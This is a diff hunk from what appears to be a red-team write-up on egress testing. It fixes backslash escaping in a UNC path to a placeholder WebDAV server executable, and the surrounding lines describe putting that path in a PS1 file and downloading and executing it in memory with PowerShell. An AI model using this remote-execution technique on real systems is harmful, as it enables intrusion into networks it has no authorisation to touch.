@@ -87,7 +87,7 @@ You can see we're crossing the wire via 80 and 443, confirmed!
 
 - First, create a PS1 file that contains the following:
 
-**\\YOURWEBDAV_SERVER\shared-files\yourexecutable.exe**
+**\\\\YOURWEBDAV_SERVER\\shared-files\\yourexecutable.exe**
 
 Next, upload that somewhere and download and execute in memory using powershell:
 
